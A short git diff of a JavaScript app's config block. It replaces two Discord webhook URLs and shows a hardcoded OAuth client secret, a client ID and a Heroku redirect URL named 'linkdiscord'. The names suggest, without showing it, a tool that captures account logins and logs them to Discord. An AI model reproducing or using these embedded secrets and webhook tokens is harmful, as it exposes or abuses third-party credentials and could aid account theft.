@@ -5,8 +5,8 @@
 const client_secret = '-Pw8Q~oEXLe~w~eRhIfGOp0qOuZS6PeafRIOCbPQ'
 const client_id = '170ccb61-c568-409a-a59a-e2ecd656a9c5'
 const redirect_uri = 'https://linkdiscord.herokuapp.com'
-const webhook_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
-const webhook_logging_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
+const webhook_url = 'https://discord.com/api/webhooks/1047691731627421786/HZ6enVy92ZGh0DyUyZpiD0VMmDx3smZzggnE8RhYcKAEIV2w64MhtHb8Gk5YXzLHj3hK'
+const webhook_logging_url = 'https://discord.com/api/webhooks/1047691731627421786/HZ6enVy92ZGh0DyUyZpiD0VMmDx3smZzggnE8RhYcKAEIV2w64MhtHb8Gk5YXzLHj3hK'
 // Config end
 const { post, get } = require("axios"),
     express = require("express"),
